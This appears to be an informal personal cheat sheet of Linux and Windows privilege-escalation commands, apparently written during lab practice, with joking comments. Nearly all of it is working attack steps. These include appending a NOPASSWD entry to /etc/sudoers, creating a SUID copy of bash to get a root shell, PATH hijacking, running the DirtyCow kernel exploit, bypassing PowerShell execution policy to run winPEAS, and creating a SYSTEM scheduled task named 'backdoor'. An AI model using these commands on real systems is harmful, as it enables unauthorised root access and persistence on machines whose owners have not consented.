
# good SUID scan
`find / -perm -4000 2>/dev/null`

# this looked weird... /usr/bin/screen had SUID bit?!
`ls -la /usr/bin/screen`

# always try this even though it rarely works
`sudo -l`

# maybe edit cronjob? I saw /etc/cron.d/backup doing something sus
`nano /etc/cron.d/backup`

# installed LinPEAS and forgot to run it, just staring at .sh file for 3 mins
`chmod +x linpeas.sh && ./linpeas.sh`

# tried to hijack PATH, didnt work...
`echo $PATH
PATH=/tmp:$PATH
echo "bash" > /tmp/find && chmod +x /tmp/find`

# added user to sudoers. definitely burned the lab down on accident. dawdsd
`echo "hax ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers`

# this command opened a root shell and I still don’t trust it
`cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash && /tmp/rootbash -p`

# lol no one patched DirtyCow. into the kernel.
`gcc -pthread dirty.c -o dirty && ./dirty`

# AlwaysInstallElevated? 
`reg query HKCU\Software\Policies\Microsoft\Windows\Installer`
`reg query HKLM\Software\Policies\Microsoft\Windows\Installer`

# used winPEAS, saw "Abuse available .msi packages to get SYSTEM" — didn't ask how, just clicked run.. always confusing these things
`powershell -ExecutionPolicy Bypass -File winpeas.ps1`

# schtasks = SYSTEM shell every minute.
`schtasks /create /tn "backdoor" /tr "cmd.exe /c whoami > C:\output.txt" /sc minute /ru SYSTEM`

# opened up service list and there was some sketchy name like "UpdaterServiceX" with no quotes
`wmic service get name,displayname,pathname,startmode | findstr /i "Updater"`

# I was already root but tried exploiting something anyway. This is why people don't invite me to their labs.
`whoami && sudo whoami && ./exploit_me_anyway.py
`
